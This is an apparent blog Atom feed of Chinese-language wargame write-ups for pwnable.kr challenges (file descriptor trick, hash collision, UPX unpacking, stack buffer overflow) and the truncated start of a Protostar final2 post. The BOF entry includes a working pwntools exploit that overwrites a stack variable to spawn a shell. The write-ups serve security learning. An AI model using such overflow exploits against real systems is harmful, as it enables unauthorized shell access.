<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>UyuniCat&#39;s Blog</title>
  <icon>https://www.gravatar.com/avatar/b868ea52a14ccfbf43894e80aca59f74</icon>
  <subtitle>Welcome to my blog</subtitle>
  <link href="/atom.xml" rel="self"/>
  
  <link href="http://yoursite.com/"/>
  <updated>2020-03-15T08:45:01.467Z</updated>
  <id>http://yoursite.com/</id>
  
  <author>
    <name>UyuniCat</name>
    <email>uyunicat@protonmail.com</email>
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Hello World</title>
    <link href="http://yoursite.com/2020/03/15/hello-world/"/>
    <id>http://yoursite.com/2020/03/15/hello-world/</id>
    <published>2020-03-15T08:45:01.467Z</published>
    <updated>2020-03-15T08:45:01.467Z</updated>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">bash</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure></div><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;Welcome to &lt;a href=&quot;https://hexo.io/&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;Hexo&lt;/a&gt;! This is your very first post. Check &lt;a href=&quot;https://hexo.
      
    
    </summary>
    
    
    
  </entry>
  
  <entry>
    <title>Flag</title>
    <link href="http://yoursite.com/2019/08/30/flag/"/>
    <id>http://yoursite.com/2019/08/30/flag/</id>
    <published>2019-08-30T15:42:21.000Z</published>
    <updated>2019-08-31T16:18:49.956Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-Flag"><a href="#Toddler’s-Bottle-Flag" class="headerlink" title="Toddler’s Bottle Flag"></a>Toddler’s Bottle Flag</h1><p>直接上题目</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Papa brought me a packed present! let&#39;s open it.</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;flag</span><br><span class="line"></span><br><span class="line">This is reversing task. all you need is binary</span><br></pre></td></tr></table></figure></div><h1 id="调试"><a href="#调试" class="headerlink" title="调试"></a>调试</h1><p>先运行看看<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_1.png" data-fancybox="group" data-caption="flag_1" class="fancybox"><img alt="flag_1" title="flag_1" data-src="https://dblu3.github.io/img/pwnable.kr/flag_1.png" class="lazyload"></a></p><p>好像跟题目说的一样，是个单纯的逆向题</p><p>拖入IDA中，发现里面的函数太少，应该是加过壳的</p><p>再仔细找找，结果发现了upx字样，应该是upx壳<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_2.png" data-fancybox="group" data-caption="flag_2" class="fancybox"><img alt="flag_2" title="flag_2" data-src="https://dblu3.github.io/img/pwnable.kr/flag_2.png" class="lazyload"></a></p><h1 id="脱壳"><a href="#脱壳" class="headerlink" title="脱壳"></a>脱壳</h1><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">upd -d flag -o flag_upx</span><br></pre></td></tr></table></figure></div><p>搞定<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_3.png" data-fancybox="group" data-caption="flag_3" class="fancybox"><img alt="flag_3" title="flag_3" data-src="https://dblu3.github.io/img/pwnable.kr/flag_3.png" class="lazyload"></a></p><h1 id="Flag"><a href="#Flag" class="headerlink" title="Flag"></a>Flag</h1><p>把脱壳后的文件继续拉入IDA里面，轻松找到了flag<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_4.png" data-fancybox="group" data-caption="flag_4" class="fancybox"><img alt="flag_4" title="flag_4" data-src="https://dblu3.github.io/img/pwnable.kr/flag_4.png" class="lazyload"></a></p><p>提交后发现不正确，应该是漏掉了什么</p><p>用Notepad++打开，搜索UPX，发现完整的flag  =。=<br><a href="https://dblu3.github.io/img/pwnable.kr/flag_5.png" data-fancybox="group" data-caption="flag_5" class="fancybox"><img alt="flag_5" title="flag_5" data-src="https://dblu3.github.io/img/pwnable.kr/flag_5.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-Flag&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-Flag&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle Flag&quot;&gt;&lt;/a&gt;Toddler’s Bottle Flag&lt;/h1&gt;&lt;p&gt;直接上题目&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>BOF</title>
    <link href="http://yoursite.com/2019/08/26/BOF/"/>
    <id>http://yoursite.com/2019/08/26/BOF/</id>
    <published>2019-08-26T15:12:52.000Z</published>
    <updated>2019-08-31T16:24:04.276Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-BOF"><a href="#Toddler’s-Bottle-BOF" class="headerlink" title="Toddler’s Bottle BOF"></a>Toddler’s Bottle BOF</h1><p>直接看题目，主要是关于缓冲区溢出的</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nana told me that buffer overflow is one of the most common software vulnerability. </span><br><span class="line">Is that true?</span><br><span class="line"></span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof</span><br><span class="line">Download : http:&#x2F;&#x2F;pwnable.kr&#x2F;bin&#x2F;bof.c</span><br><span class="line"></span><br><span class="line">Running at : nc pwnable.kr 9000</span><br></pre></td></tr></table></figure></div><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>bof.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">func</span><span class="params">(<span class="keyword">int</span> key)</span></span>&#123;</span><br><span class="line"><span class="keyword">char</span> overflowme[<span class="number">32</span>];</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"overflow me : "</span>);</span><br><span class="line">gets(overflowme);<span class="comment">// smash me!</span></span><br><span class="line"><span class="keyword">if</span>(key == <span class="number">0xcafebabe</span>)&#123;</span><br><span class="line">system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">"Nah..\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">func(<span class="number">0xdeadbeef</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="bof"><a href="#bof" class="headerlink" title="bof"></a>bof</h1><p>用IDA打开看看</p><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_1.png" data-fancybox="group" data-caption="bof_1" class="fancybox"><img alt="bof_1" title="bof_1" data-src="https://dblu3.github.io/img/pwnable.kr/bof_1.png" class="lazyload"></a></p><p>这时候我们注意到char s的位置是ebp-2ch</p><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_2.png" data-fancybox="group" data-caption="bof_2" class="fancybox"><img alt="bof_2" title="bof_2" data-src="https://dblu3.github.io/img/pwnable.kr/bof_2.png" class="lazyload"></a></p><p>那么当gets()函数获取s时，我们就可以通过缓冲区溢出获取”/bin/sh”</p><h1 id="Offset"><a href="#Offset" class="headerlink" title="Offset"></a>Offset</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_3.png" data-fancybox="group" data-caption="bof_3" class="fancybox"><img alt="bof_3" title="bof_3" data-src="https://dblu3.github.io/img/pwnable.kr/bof_3.png" class="lazyload"></a></p><p>记得加上arg_0的8个字节<br>0x2c + 0x8 = 0x34 = 52</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>52个字节的padding + 0xcafebabe 就行了</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">python</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight python"><figcaption><span>bof.py</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">r = remote(<span class="string">'pwnable.kr'</span>, <span class="number">9000</span>)</span><br><span class="line"></span><br><span class="line">padding = <span class="string">'A'</span>*<span class="number">52</span></span><br><span class="line">payload = padding + p32(<span class="number">0xcafebabe</span>)</span><br><span class="line"></span><br><span class="line">r.send(payload)</span><br><span class="line">r.interactive()</span><br></pre></td></tr></table></figure></div><p><a href="https://dblu3.github.io/img/pwnable.kr/bof_4.png" data-fancybox="group" data-caption="bof_4" class="fancybox"><img alt="bof_4" title="bof_4" data-src="https://dblu3.github.io/img/pwnable.kr/bof_4.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-BOF&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-BOF&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle BOF&quot;&gt;&lt;/a&gt;Toddler’s Bottle BOF&lt;/h1&gt;&lt;p&gt;直接看题目，主要是关于缓冲区溢出的&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Collision</title>
    <link href="http://yoursite.com/2019/08/25/Collision/"/>
    <id>http://yoursite.com/2019/08/25/Collision/</id>
    <published>2019-08-25T07:01:39.000Z</published>
    <updated>2019-08-26T16:16:20.255Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Toddler’s-Bottle-Collision"><a href="#Toddler’s-Bottle-Collision" class="headerlink" title="Toddler’s Bottle Collision"></a>Toddler’s Bottle Collision</h1><p>Toddler’s Bottle 的第二道题，首先看下给出的题目给出的提示：这道题主要是关于MD5 Hash碰撞</p><a id="more"></a><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Daddy told me about cool MD5 hash collision today.</span><br><span class="line">I wanna do something like that too!</span><br><span class="line"></span><br><span class="line">ssh col@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure></div><h1 id="登录查看"><a href="#登录查看" class="headerlink" title="登录查看"></a>登录查看</h1><p>发现了3个文件</p><p><a href="https://dblu3.github.io/img/pwnable.kr/col_1.png" data-fancybox="group" data-caption="col_1" class="fancybox"><img alt="col_1" title="col_1" data-src="https://dblu3.github.io/img/pwnable.kr/col_1.png" class="lazyload"></a></p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>col.c</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> hashcode = <span class="number">0x21DD09EC</span>;</span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> <span class="keyword">long</span> <span class="title">check_password</span><span class="params">(<span class="keyword">const</span> <span class="keyword">char</span>* p)</span></span>&#123;</span><br><span class="line">        <span class="keyword">int</span>* ip = (<span class="keyword">int</span>*)p;</span><br><span class="line">        <span class="keyword">int</span> i;</span><br><span class="line">        <span class="keyword">int</span> res=<span class="number">0</span>;</span><br><span class="line">        <span class="keyword">for</span>(i=<span class="number">0</span>; i&lt;<span class="number">5</span>; i++)&#123;</span><br><span class="line">                res += ip[i];</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> res;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">char</span>* argv[])</span></span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(argc&lt;<span class="number">2</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"usage : %s [passcode]\n"</span>, argv[<span class="number">0</span>]);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span>(<span class="built_in">strlen</span>(argv[<span class="number">1</span>]) != <span class="number">20</span>)&#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"passcode length should be 20 bytes\n"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(hashcode == check_password( argv[<span class="number">1</span>] ))&#123;</span><br><span class="line">                system(<span class="string">"/bin/cat flag"</span>);</span><br><span class="line">                <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span></span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">"wrong passcode.\n"</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>看源码就知道了，题目要求我们输入的20个字符转换成5个int类型的整数后相加的结果等于0x21DD09EC</p><p>这里需要注意的是strlen函数，我们输入的字符串不能包含0</p><p>简单换算下就行了</p><p>0x21DD09EC   = 568134124<br>0x21DD09EC/5 = 113626824.8<br>0x21DD09EC/5+0.2 = 0x6C5CEC9<br>0x6C5CEC9*5    = 568134125</p><p>相加之后多了1，那么把其中一个数减1，也就是改成0x6C5CEC8就行了</p><p>最后我们只要输入4个0x6C5CEC9+1个0x6C5CEC8就可以了</p><p>字节是从低位开始存储的，所以输入的时候记得换下顺序</p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/col_2.png" data-fancybox="group" data-caption="col_2" class="fancybox"><img alt="col_2" title="col_2" data-src="https://dblu3.github.io/img/pwnable.kr/col_2.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;Toddler’s-Bottle-Collision&quot;&gt;&lt;a href=&quot;#Toddler’s-Bottle-Collision&quot; class=&quot;headerlink&quot; title=&quot;Toddler’s Bottle Collision&quot;&gt;&lt;/a&gt;Toddler’s Bottle Collision&lt;/h1&gt;&lt;p&gt;Toddler’s Bottle 的第二道题，首先看下给出的题目给出的提示：这道题主要是关于MD5 Hash碰撞&lt;/p&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>FD</title>
    <link href="http://yoursite.com/2019/08/18/fd/"/>
    <id>http://yoursite.com/2019/08/18/fd/</id>
    <published>2019-08-18T10:57:24.000Z</published>
    <updated>2019-08-31T16:17:02.534Z</updated>
    
    <content type="html"><![CDATA[<h1 id="关于Pwnable-kr"><a href="#关于Pwnable-kr" class="headerlink" title="关于Pwnable.kr"></a>关于Pwnable.kr</h1><blockquote><p><a href="https://pwnable.kr/index.php" target="_blank" rel="noopener">pwnable.kr</a>是一个wargame site，提供了各种难度的pwn题供大家学习和挑战</p></blockquote><a id="more"></a><h1 id="Toddler’s-Bottle-FD"><a href="#Toddler’s-Bottle-FD" class="headerlink" title="Toddler’s Bottle FD"></a>Toddler’s Bottle FD</h1><p>Toddler’s Bottle是pwnable.kr里面难度最低的，这次做的是第一题fd</p><p>首先点开题目，发现作者给出了提示，这道题应该是关于linux文件描述符的</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">Code</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Mommy! what is a file descriptor in Linux?</span><br><span class="line"></span><br><span class="line">* try to play the wargame your self but if you are ABSOLUTE beginner, follow this tutorial link:</span><br><span class="line">https:&#x2F;&#x2F;youtu.be&#x2F;971eZhMHQQw</span><br><span class="line"></span><br><span class="line">ssh fd@pwnable.kr -p2222 (pw:guest)</span><br></pre></td></tr></table></figure></div><h1 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/fd_1.png" data-fancybox="group" data-caption="fd_1" class="fancybox"><img alt="fd_1" title="fd_1" data-src="https://dblu3.github.io/img/pwnable.kr/fd_1.png" class="lazyload"></a></p><h1 id="查看"><a href="#查看" class="headerlink" title="查看"></a>查看</h1><p><a href="https://dblu3.github.io/img/pwnable.kr/fd_2.png" data-fancybox="group" data-caption="fd_2" class="fancybox"><img alt="fd_2" title="fd_2" data-src="https://dblu3.github.io/img/pwnable.kr/fd_2.png" class="lazyload"></a><br>发现flag文件，但是我们没有权限查看，但是我们有fd这个文件的执行权限</p><p>话虽如此，但还是要尝试一下能不能授权=。=<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_3.png" data-fancybox="group" data-caption="fd_3" class="fancybox"><img alt="fd_3" title="fd_3" data-src="https://dblu3.github.io/img/pwnable.kr/fd_3.png" class="lazyload"></a><br>果然不行- -</p><p>还是老老实实看下fd.c的内容吧<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_4.png" data-fancybox="group" data-caption="fd_4" class="fancybox"><img alt="fd_4" title="fd_4" data-src="https://dblu3.github.io/img/pwnable.kr/fd_4.png" class="lazyload"></a></p><h1 id="分析"><a href="#分析" class="headerlink" title="分析"></a>分析</h1><p>提示了让我们去学Linux file IO~</p><p>如果你不懂这部分的知识，那就老老实实地去学一遍吧=。=</p><p>其实挺简单的<br>fd = 0：标准输入<br>fd = 1：标准输出<br>fd = 2：标准错误输出</p><p>再结合fd.c里面的内容看，已经很明显了<br>就是让fd=0，然后我们输入LETMEWIN，他就会输出flag了~</p><p>那么如何让fd=0呢？<br>我们注意到这行</p><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> fd = atoi( argv[<span class="number">1</span>]) - <span class="number">0x1234</span>);</span><br></pre></td></tr></table></figure></div><p>那么我们只要提供10进制的参数-0x1234就能使fd=0了<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_5.png" data-fancybox="group" data-caption="fd_5" class="fancybox"><img alt="fd_5" title="fd_5" data-src="https://dblu3.github.io/img/pwnable.kr/fd_5.png" class="lazyload"></a></p><h1 id="Pwn"><a href="#Pwn" class="headerlink" title="Pwn"></a>Pwn</h1><p>成功拿到flag<br><a href="https://dblu3.github.io/img/pwnable.kr/fd_6.png" data-fancybox="group" data-caption="fd_6" class="fancybox"><img alt="fd_6" title="fd_6" data-src="https://dblu3.github.io/img/pwnable.kr/fd_6.png" class="lazyload"></a></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;关于Pwnable-kr&quot;&gt;&lt;a href=&quot;#关于Pwnable-kr&quot; class=&quot;headerlink&quot; title=&quot;关于Pwnable.kr&quot;&gt;&lt;/a&gt;关于Pwnable.kr&lt;/h1&gt;&lt;blockquote&gt;
&lt;p&gt;&lt;a href=&quot;https://pwnable.kr/index.php&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;pwnable.kr&lt;/a&gt;是一个wargame site，提供了各种难度的pwn题供大家学习和挑战&lt;/p&gt;
&lt;/blockquote&gt;
    
    </summary>
    
    
    
      <category term="Pwn" scheme="http://yoursite.com/tags/Pwn/"/>
    
  </entry>
  
  <entry>
    <title>Protostar_final2</title>
    <link href="http://yoursite.com/2018/09/25/Protostar-final2/"/>
    <id>http://yoursite.com/2018/09/25/Protostar-final2/</id>
    <published>2018-09-25T03:51:34.000Z</published>
    <updated>2018-09-25T10:46:14.407Z</updated>
    
    <content type="html"><![CDATA[<h1 id="Final2"><a href="#Final2" class="headerlink" title="Final2"></a>Final2</h1><p>Final2: Protostar系列的最后一题了</p><a id="more"></a><h2 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h2><div class="code-area-wrap"><div class="highlight-tools"><i class="fa fa-angle-down code-expand" aria-hidden="true"></i><div class="code_lang">c</div><div class="copy-notice"></div><i class="fa fa-clipboard" aria-hidden="true"></i></div><figure class="highlight c"><figcaption><span>Final2</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/common.c"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">"../common/malloc.c"</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> NAME <span class="meta-string">"final2"</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> UID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> GID 0</span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> PORT 2993</span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">define</span> REQSZ 128</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">check_path</span><span class="params">(<span class="keyword">char</span> *buf)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> *start;</span><br><span class="line">  <span class="keyword">char</span> *p;</span><br><span class="line">  <span class="keyword">int</span> l;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">  